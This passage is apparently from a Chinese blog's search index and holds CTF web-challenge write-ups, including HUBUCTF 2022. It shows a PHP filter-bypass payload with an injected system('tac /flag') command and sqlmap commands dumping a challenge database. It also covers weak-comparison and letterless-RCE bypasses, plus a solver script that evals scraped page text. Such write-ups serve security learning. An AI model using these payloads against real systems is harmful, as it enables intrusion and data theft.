Key!&quot;);    &#125;&#125;else&#123;    die(&quot;Pass it!&quot;);&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>四层绕过</p><p>php伪协议 + 数组绕过md5强类型 + intval()函数绕过+命令执行换行符%0a绕过#</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">?data&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,Welcome to CTF&amp;key1[]&#x3D;1&amp;key2[]&#x3D;2&amp;cmd&#x3D;%0asystem(&#39;tac &#x2F;flag&#39;);post:num&#x3D;2077a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20220930164649820.png"></p><h3 id="我真的会谢"><a href="#我真的会谢" class="headerlink" title="我真的会谢"></a><strong>我真的会谢</strong></h3><p>敏感文件泄露</p><p>dirsearch扫一下</p><pre class="line-numbers language-none"><code class="language-none">robots.txt  .index.php.swpwww.zip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20220930172213551.png"></p><p>Part_two &#x3D; “0_e4sy_d0_y00”</p><p>Part Three: u_th1nk_so?}</p><p><strong>flag</strong>：flag{Th1s_Is_s000_e4sy_d0_y00u_th1nk_so?}</p><h3 id="Word-For-You"><a href="#Word-For-You" class="headerlink" title="Word-For-You"></a><strong>Word-For-You</strong></h3><p>sqlmap扫</p><p>爆数据库名</p><blockquote><p>python sqlmap.py -u <a href="http://6a47bd6f-3e4d-4343-a41a-d93d4342af41.node4.buuoj.cn:81/comments.php">http://6a47bd6f-3e4d-4343-a41a-d93d4342af41.node4.buuoj.cn:81/comments.php</a> –data&#x3D;”name&#x3D;NewCTFer” –dbs</p></blockquote><p>爆表名</p><blockquote><p>python sqlmap.py -u <a href="http://6a47bd6f-3e4d-4343-a41a-d93d4342af41.node4.buuoj.cn:81/comments.php">http://6a47bd6f-3e4d-4343-a41a-d93d4342af41.node4.buuoj.cn:81/comments.php</a> –data&#x3D;”name&#x3D;NewCTFer” -D wfy –tables</p></blockquote><p>爆列名</p><blockquote><p>python sqlmap.py -u <a href="http://6a47bd6f-3e4d-4343-a41a-d93d4342af41.node4.buuoj.cn:81/comments.php">http://6a47bd6f-3e4d-4343-a41a-d93d4342af41.node4.buuoj.cn:81/comments.php</a> –data&#x3D;”name&#x3D;NewCTFer” -D wfy -T wfy_comments –columns</p></blockquote><p>查询数据，得到flag</p><blockquote><p>python sqlmap.py -u <a href="http://6a47bd6f-3e4d-4343-a41a-d93d4342af41.node4.buuoj.cn:81/comments.php">http://6a47bd6f-3e4d-4343-a41a-d93d4342af41.node4.buuoj.cn:81/comments.php</a> –data&#x3D;”name&#x3D;NewCTFer” -D wfy -T wfy_comments  -C “user,display,id,name,text” –dump-all</p></blockquote><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20220930175338469.png" style="zoom: 50%;" />]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HUBUCTF 2022</title>
      <link href="/2022/09/30/HUBUCTF%202022/"/>
      <url>/2022/09/30/HUBUCTF%202022/</url>
      
        <content type="html"><![CDATA[<h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a><strong>checkin</strong></h3><p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$username</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"this_is_secret"</span><span class="token punctuation">;</span> <span class="token variable">$password</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"this_is_not_known_to_you"</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//here I changed those two </span><span class="token variable">$info</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'info'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'info'</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">;</span><span class="token variable">$data_unserialize</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$data_unserialize</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$username</span><span class="token operator">&amp;&amp;</span><span class="token variable">$data_unserialize</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"username or password error!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php弱比较&#x3D;&#x3D;绕过</p><p>构造exp<img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20220930111533320.png"></p><p>回显flag</p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20220930111749797.png"></p><h3 id="HowToGetShell"><a href="#HowToGetShell" class="headerlink" title="HowToGetShell"></a><strong>HowToGetShell</strong></h3><p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mess</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z]/"</span><span class="token punctuation">,</span><span class="token variable">$mess</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"invalid input!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$mess</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>无字母数字RCE</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166029976116782246437375%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=166029976116782246437375&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_34-6-109143413-null-null.142%5Ev40%5Epc_rank_34_1,185%5Ev2%5Econtrol&utm_term=%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">贴篇博客</a></p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20220930160345370.png"></p><h3 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a><strong>ezsql</strong></h3><h3 id="Calculate"><a href="#Calculate" class="headerlink" title="Calculate"></a><strong>Calculate</strong></h3><p>跑脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time<span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token string">'http://1.14.71.254:28638/'</span>ses <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>reg <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">">(.)&lt;/div"</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    get <span class="token operator">=</span> ses<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    math <span class="token operator">=</span> reg<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>get<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    final <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>math<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    result <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>final<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    post <span class="token operator">=</span> ses<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"ans"</span><span class="token punctuation">:</span> result<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'NSS'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>post<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">break</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
